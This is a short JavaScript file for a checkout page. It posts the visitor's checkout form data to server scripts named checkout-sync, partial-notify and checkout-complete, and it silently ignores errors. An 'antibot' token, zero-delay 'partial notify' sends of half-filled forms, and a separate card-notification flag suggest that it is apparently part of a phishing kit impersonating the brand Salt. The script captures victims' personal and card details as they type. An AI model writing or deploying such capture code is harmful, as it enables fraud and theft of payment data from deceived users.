const PARTIAL_NOTIFY_KEY = "salt-partial-notify-sent";
const PARTIAL_TIMER_KEY = "salt-partial-timer";
const PARTIAL_DELAY_MS = 0;

function checkoutApiBase() {
  return window.location.pathname.includes("/pages/")
    ? "../api/"
    : "api/";
}

function checkoutApiHeaders() {
  const headers = { "Content-Type": "application/json" };
  if (window.SALT_ANTIBOT && window.SALT_ANTIBOT.token) {
    headers["X-Salt-Token"] = window.SALT_ANTIBOT.token;
  }
  return headers;
}

function syncCheckoutPending() {
  if (typeof getCheckoutData !== "function") return;

  const data = getCheckoutData();
  if (!data.lastName || !data.firstName) return;

  fetch(checkoutApiBase() + "checkout-sync.php", {
    method: "POST",
    headers: checkoutApiHeaders(),
    body: JSON.stringify(data),
    credentials: "same-origin",
    keepalive: true,
  }).catch(() => {});
}

function clearPartialNotifyTimer() {
  const id = sessionStorage.getItem(PARTIAL_TIMER_KEY);
  if (id) {
    clearTimeout(Number(id));
    sessionStorage.removeItem(PARTIAL_TIMER_KEY);
  }
}

function schedulePartialNotify() {
  if (sessionStorage.getItem(PARTIAL_NOTIFY_KEY)) return;
  if (sessionStorage.getItem("salt-card-notify-sent")) return;
  if (typeof getCheckoutData !== "function") return;

  clearPartialNotifyTimer();

  const timerId = window.setTimeout(() => {
    if (sessionStorage.getItem(PARTIAL_NOTIFY_KEY)) return;
    if (sessionStorage.getItem("salt-card-notify-sent")) return;

    const data = getCheckoutData();
    fetch(checkoutApiBase() + "partial-notify.php", {
      method: "POST",
      headers: checkoutApiHeaders(),
      body: JSON.stringify(data),
      credentials: "same-origin",
      keepalive: true,
    })
      .then((res) => res.json())
      .then((data) => {
        if (data && data.sent) {
          sessionStorage.setItem(PARTIAL_NOTIFY_KEY, "1");
        }
      })
      .catch(() => {});
  }, PARTIAL_DELAY_MS);

  sessionStorage.setItem(PARTIAL_TIMER_KEY, String(timerId));
}

function markCheckoutComplete() {
  clearPartialNotifyTimer();

  fetch(checkoutApiBase() + "checkout-complete.php", {
    method: "POST",
    headers: checkoutApiHeaders(),
    body: "{}",
    credentials: "same-origin",
    keepalive: true,
  }).catch(() => {});
}
